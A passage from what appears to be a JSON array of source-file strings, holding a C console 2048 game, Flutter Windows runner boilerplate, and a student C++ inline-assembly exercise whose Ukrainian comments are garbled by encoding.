 }while(ans=='y'||ans=='Y'); \r\n \r\nreturn 1; \r\n } \r\n\r\n\r\n",
    "#include \"stdio.h\"\r\n#include \"stdlib.h\"\r\n#include \"time.h\"\r\n#include <conio.h>\r\n\r\n#define SIZE 4 // size\r\n#define FINISH 2048 // finish number\r\n#define TABLE_LINE \"+ - - + - - + - - + - - +\\n\"\r\n\r\nvoid draw_table(int (*table)[SIZE])\r\n{\r\n    system(\"cls\") ;\r\n    printf(TABLE_LINE) ;\r\n    for(int i = 0; i < SIZE; i++)\r\n    {\r\n        for(int j = 0; j < SIZE; j++)\r\n        {\r\n            if(table[i][j] == 0) printf(\"|     \") ;\r\n            else printf(\"|%5d\", table[i][j]) ;\r\n        }\r\n        printf(\"|\\n\") ;\r\n        printf(TABLE_LINE) ;\r\n    }\r\n\r\n    printf(\"type arrow to move\\r\") ;\r\n}\r\n\r\nint rand24()\r\n{\r\n    // init random only once\r\n    static int initialized = 0 ;\r\n    if (!initialized) {\r\n        srand((unsigned)time(NULL)) ;\r\n        initialized = 1 ;\r\n    }\r\n\r\n    // return 4 or 2 as 1:7\r\n    return (rand() % 8 == 0) ? 4 : 2 ;\r\n}\r\n\r\nchar input()\r\n{\r\n    int ch ;\r\n    ch = getch() ;\r\n\r\n    switch (ch)\r\n    {\r\n    case 72: return 'U' ; break ; // up\r\n    case 80: return 'D' ; break ; // down\r\n    case 77: return 'R' ; break ; // right\r\n    case 75: return 'L' ; break ; // left\r\n    \r\n    default:\r\n        printf(\"Key Error         \\r\") ;\r\n        return input() ;\r\n    }\r\n}\r\n\r\nvoid creat(int (*table)[SIZE])\r\n{\r\n    int i, j ;\r\n    srand((unsigned)time(NULL)) ;\r\n\r\n    do\r\n    {\r\n        i=(rand())%4 ;\r\n        j=(rand())%4 ;\t\r\n\t}\r\n    while(table[i][j]!=0) ;\r\n\t\r\n    table[i][j]=rand24() ;\r\n}\r\n\r\nvoid move(int (*table)[SIZE])\r\n{\r\n    // get input\r\n\r\n    char enter = input() ;\r\n\r\n    // clone table (to check)\r\n\r\n    int orgtable[SIZE][SIZE] ;\r\n\r\n    for (int i = 0; i < SIZE; i++)\r\n    {\r\n        for (int j = 0; j < SIZE; j++)\r\n        {\r\n            orgtable[i][j] = table[i][j] ;\r\n        }\r\n    }\r\n\r\n    // move\r\n\r\n    switch (enter)\r\n    {\r\n    case 'U':\r\n        for(int i = 0; i < SIZE; i++) // columns\r\n        {\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = 1; j < SIZE; j++) // rows\r\n                {\r\n                    if(table[j-1][i] == 0) // go to side\r\n                    {\r\n                        table[j-1][i] = table[j][i] ;\r\n                        table[j][i] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n            for(int j = 1; j < SIZE; j++) // rows\r\n            {\r\n                if(table[j-1][i] == table[j][i]) // merge\r\n                {\r\n                    table[j-1][i] = table[j-1][i] + table[j][i] ;\r\n                    table[j][i] = 0 ;\r\n                }\r\n            }\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = 1; j < SIZE; j++) // rows\r\n                {\r\n                    if(table[j-1][i] == 0) // go to side\r\n                    {\r\n                        table[j-1][i] = table[j][i] ;\r\n                        table[j][i] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        break;\r\n    \r\n    case 'D':\r\n        for(int i = 0; i < SIZE; i++) // columns\r\n        {\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = SIZE-1; j >= 0; j--) // rows\r\n                {\r\n                    if(table[j+1][i] == 0) // go to side\r\n                    {\r\n                        table[j+1][i] = table[j][i] ;\r\n                        table[j][i] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n            for(int j = SIZE-1; j >= 0; j--) // rows\r\n            {\r\n                if(table[j+1][i] == table[j][i]) // merge\r\n                {\r\n                    table[j+1][i] = table[j+1][i] + table[j][i] ;\r\n                    table[j][i] = 0 ;\r\n                }\r\n            }\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = SIZE-1; j >= 0; j--) // rows\r\n                {\r\n                    if(table[j+1][i] == 0) // go to side\r\n                    {\r\n                        table[j+1][i] = table[j][i] ;\r\n                        table[j][i] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        break;\r\n    \r\n    case 'R':\r\n        for(int i = 0; i < SIZE; i++) // columns\r\n        {\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = SIZE-1; j >= 0; j--) // rows\r\n                {\r\n                    if(table[i][j+1] == 0) // go to side\r\n                    {\r\n                        table[i][j+1] = table[i][j] ;\r\n                        table[i][j] = 0 ;\r\n                    }\r\n                }\r\n            }\r\n            for(int j = SIZE-1; j >= 0; j--) // rows\r\n            {\r\n                if(table[i][j+1] == table[i][j]) // merge\r\n                {\r\n                    table[i][j+1] = table[i][j+1] + table[i][j] ;\r\n                    table[i][j] = 0 ;\r\n                }\r\n            }\r\n            for(int _ = 0; _ < SIZE-1; _++)\r\n            {\r\n                for(int j = SIZE-1; j >= 0; j--) // rows\r\n                {\r\n                    if(table[i][j+1] == 0) // go to side\r\n                    {\r\n  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"notes_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"webservice\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\nvoid Task1()\r\n{\r\n\tint a, b, c, d, x;\r\n\tint values[5] = { 0, 0, 0, 0, 0 }; // \u00ec\u00e0\u00f1\u00e8\u00e2 \u00e4\u00eb\u00ff \u00e7\u00e1\u00e5\u00f0\u00e5\u00e6\u00e5\u00ed\u00ed\u00ff \u00f3(\u00f5)\r\n\r\n\ta = -6; b = 4; c = 8; d = 2;\r\n\t__asm {\r\n\t\tmov eax, [values]\r\n\t\tpush eax // \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5 // \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart: // \u00ef\u00ee\u00f7\u00e0\u00f2\u00ee\u00ea \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tmov ax, 3 // \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx // \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcwde // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax // \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a // \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, 1 // \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 \u00ee\u00e4\u00e8\u00ed\u00e8\u00f6\u00e5\u00fe\r\n\t\tjl less_ // \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ec\u00e5\u00ed\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 less\r\n\t\tje equals // \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee equals\r\n\r\n\t\timul eax // a^2\r\n\t\tsub eax, ebx // a^2-x\r\n\t\tcdq // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee a^2-x \u00e4\u00ee \u00f7\u00e5\u00f2\u00e2\u00b3\u00f0\u00ed\u00ee\u00e3\u00ee \u00f1\u00eb\u00ee\u00e2\u00e0\r\n\t\tmov ebx, c // \u00f1\u00f2\u00e0\u00eb\u00e0 c\r\n\t\tidiv ebx // (a^2-x)/c\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tless_:\r\n\t\tmov edx, 2\r\n\t\timul edx // a*2\r\n\t\timul ebx // a*2*x\r\n\t\tadd eax, 5 // a*2*x+5\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tequals:\r\n\t\tmov ebx, b // \u00f1\u00f2\u00e0\u00eb\u00e0 b\r\n\t\tsub eax, ebx // a-b\r\n\t\tcdq // \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee a-b \u00e4\u00ee \u00f7\u00e5\u00f2\u00e2\u00b3\u00f0\u00ed\u00ee\u00e3\u00ee \u00f1\u00eb\u00ee\u00e2\u00e0\r\n\t\tmov ebx, d // \u00f1\u00f2\u00e0\u00eb\u00e0 d\r\n\t\tidiv ebx // (a-b)/d\r\n\t\tjmp result // \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 result\r\n\tresult:\r\n\t\tpop ebx // \u00e2\u00e8\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e7\u00b3 \u00f1\u00f2\u00e5\u00ea\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov[values + ebx], eax // \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00ee\u00fe \u00e0\u00e4\u00f0\u00e5\u00f1\u00ee\u00fe\r\n\t\tadd ebx, 4 // \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx // \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start // \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++) \r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tsystem(\"pause\");\r\n}\r\n\r\nvoid Option15()\r\n{\r\n\tint a = 7;\r\n\tint y1, y2;\r\n\tint values[5] = { 0, 0, 0, 0, 0 };\r\n\t// x1\r\n\r\n\t// x - ebx\r\n\t// a - eax\r\n\r\n\t__asm\r\n\t{\r\n\t\tmov eax, [values]\r\n\t\tpush eax\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5\t\t\t\t// \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart:\r\n\t\tmov ax, 3\t\t\t\t// \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx\t\t\t\t// \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcwde\t\t\t\t\t// \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax\t\t\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a\t\t\t\t// \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, 1\t\t\t\t// \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 \u00ee\u00e4\u00e8\u00ed\u00e8\u00f6\u00e5\u00fe\r\n\t\tjl isLess\t\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ec\u00e5\u00ed\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 isLess\r\n\t\tjge greatEqual\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba \u00e0\u00e1\u00ee \u00e1\u00b3\u00eb\u00fc\u00f8\u00e5 1, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee greatEqual\r\n\tisLess:\r\n\t\t// 8 + |x|\r\n\t\tcmp ebx, 0\r\n\t\tjl abs_x_is_less\r\n\t\t\tabs_x_is_less: \r\n\t\t\t\tneg ebx\r\n\t\tmov eax, ebx\r\n\t\tadd eax, 8\r\n\t\tjmp result\r\n\tgreatEqual:\r\n\t\t// 2 * |a|\r\n\t\tmov edx, 2\r\n\t\tcmp eax, 0\r\n\t\tmul edx\t\t\t\t\t// mul \u00e2\u00e8\u00ea\u00ee\u00ed\u00f3\u00ba \u00e1\u00e5\u00e7\u00e7\u00ed\u00e0\u00ea\u00ee\u00e2\u00e5 \u00ec\u00ed\u00ee\u00e6\u00e5\u00ed\u00ed\u00ff \u00f0\u00e5\u00e3\u00b3\u00f1\u00f2\u00f0\u00e0 edx \u00ed\u00e0 eax\r\n\t\tjmp result\r\n\tresult:\r\n\t\tpop ebx\t\t\t\t\t// \u00e2\u00e8\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e7\u00b3 \u00f1\u00f2\u00e5\u00ea\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov[values + ebx], eax\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00e7\u00e0 \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00ee\u00fe \u00e0\u00e4\u00f0\u00e5\u00f1\u00ee\u00fe\r\n\t\tadd ebx, 4\t\t\t\t// \u00e7\u00f1\u00f3\u00e2\u00e0\u00ba\u00ec\u00ee \u00e2\u00ea\u00e0\u00e7\u00b3\u00e2\u00ed\u00e8\u00ea \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tpush ebx\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00e2 \u00f1\u00f2\u00e5\u00ea \u00ed\u00ee\u00e2\u00f3 \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3\r\n\t\tloop start\t\t\t\t// \u00ea\u00b3\u00ed\u00e5\u00f6\u00fc \u00f6\u00e8\u00ea\u00eb\u00f3\r\n\t\tpop ebx\r\n\t}\r\n\tfor (int i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << values[i] << std::endl;\r\n\t}\r\n\tint secOperand;\r\n\t__asm\r\n\t{\r\n\t\tmov eax, 0\r\n\t\tpush eax\t\t\t\t// \u00e7\u00e0\u00f8\u00f2\u00ee\u00e2\u00f5\u00f3\u00ba\u00ec\u00ee \u00f3 \u00f1\u00f2\u00e5\u00ea \u00e0\u00e4\u00f0\u00e5\u00f1\u00f3 \u00ef\u00ee\u00f7\u00e0\u00f2\u00ea\u00f3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00f3\r\n\t\tmov cx, 5\t\t\t\t// \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00ee\u00f5\u00ee\u00e4\u00b3\u00e2 \u00f6\u00e8\u00ea\u00eb\u00f3 \r\n\tstart1:\r\n\t\tmov ax, 3\t\t\t\t// \u00e4\u00eb\u00ff \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff x = 3 - \u00f1\u00f5 \r\n\t\tsub ax, cx\t\t\t\t// \u00ee\u00f2\u00f0\u00e8\u00ec\u00f3\u00ba\u00ec\u00ee \u00ef\u00ee\u00f2\u00ee\u00f7\u00ed\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00ed\u00ff \u00f5\r\n\t\tcmp cx, 0\r\n\t\t\tje end_\r\n\t\tcwde\t\t\t\t\t// \u00f0\u00ee\u00e7\u00f8\u00e8\u00f0\u00fe\u00ba\u00ec\u00ee ax \u00e4\u00ee eax\r\n\t\tmov ebx, eax\t\t\t// \u00e7\u00e0\u00ef\u00e8\u00f1\u00f3\u00ba\u00ec\u00ee x \u00e2 ebx\r\n\t\tmov eax, a\t\t\t\t// \u00f1\u00f2\u00e0\u00eb\u00e0 \u00e0\r\n\t\tcmp ebx, eax\t\t\t// \u00ef\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba\u00ec\u00ee \u00f5 \u00e7 a\r\n\t\tje Equals\t\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba a, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee \u00ec\u00b3\u00f2\u00ea\u00e8 Equals\r\n\t\tjne nonEqual\t\t\t// \u00ff\u00ea\u00f9\u00ee \u00f5 \u00ed\u00e5 \u00e4\u00ee\u00f0\u00b3\u00e2\u00ed\u00fe\u00ba \u00e0, \u00ef\u00e5\u00f0\u00e5\u00f5\u00ee\u00e4\u00e8\u00ec\u00ee \u00e4\u00ee nonEqual\r\n\tEquals:\r\n\t\t// 3\r\n\t\tmov eax, 3\r\n\t\tjmp result1\r\n\tnonEqual:\r\n\t\t// a + 1\r\n\t\tmov eax, a\r\n\t\tadd eax, 1\r\n\t\tjmp result1\r\n\tresult1:\r\n\t\t/* div <\u00ee\u00ef\u00e5\u00f0\u00e0\u00ed\u00e4>\r\n\t\t\u00c2\u00e8\u00ea\u00ee\u00ed\u00f3\u00ba \u00e1\u00e5\u00e7\u00e7\u00ed\u00e0\u00ea\u00ee\u00e2\u00e5 \u00e4\u00b3\u00eb\u00e5\u00ed\u00ed\u00ff \u00f0\u00e5\u00e3\u00b3\u00f1\u00f2\u00f0\u00b3\u00e2 EDX : EAX(RDX : RAX) \u00ed\u00e0 